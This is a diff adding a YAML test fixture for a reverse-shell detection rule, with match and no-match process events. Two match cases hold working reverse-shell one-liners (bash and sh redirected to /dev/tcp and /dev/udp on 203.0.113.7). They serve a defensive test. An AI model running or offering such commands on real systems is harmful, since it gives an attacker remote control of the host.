@@ -1,0 +1,22 @@
+match:
+  - description: Interactive bash reverse shell
+    event:
+      event: {category: [process], type: [start]}
+      process:
+        name: bash
+        command_line: "bash -c 'bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'"
+        parent: {name: php-fpm}
+      user: {name: www-data}
+  - description: UDP variant
+    event:
+      event: {category: [process], type: [start]}
+      process: {name: sh, command_line: "sh -i >& /dev/udp/203.0.113.7/53 0>&1"}
+no_match:
+  - description: Ordinary bash command
+    event:
+      event: {category: [process], type: [start]}
+      process: {name: bash, command_line: "bash -c 'tail -f /var/log/syslog'"}
+  - description: Mentions /dev/tty, not a network pseudo-device
+    event:
+      event: {category: [process], type: [start]}
+      process: {name: bash, command_line: "stty -F /dev/tty1 sane"}
